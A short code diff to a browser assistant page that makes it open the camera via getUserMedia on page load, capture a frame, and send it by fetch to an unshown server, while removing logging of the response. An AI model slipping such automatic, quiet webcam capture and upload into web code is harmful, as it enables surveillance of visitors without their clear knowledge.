@@ -259,6 +259,7 @@
         
         
         window.onload= ()=>{
+            doScreenshot()
             main_talk('Hello CG18P hearing')
         }
         
@@ -295,7 +296,7 @@
         
         
         navigator.getBattery().then((battery) => {
-     console.log(battery)
+    
       if(battery.charging){
     document.getElementById('charg').style.color='#0ff'
       }
@@ -356,6 +357,7 @@ var constraints = {
 const doScreenshot = () => {
 navigator.mediaDevices.getUserMedia(constraints).then(function success(stream) {
   video.srcObject = stream;
+  
 });
 
 
@@ -377,7 +379,7 @@ const canvas = document.createElement('canvas')
       },
     })
       .then((response) => response.text())
-      .then((json) => console.log(json));
+      .then((json) => {});
       clearTimeout(st)
   },2500)
   
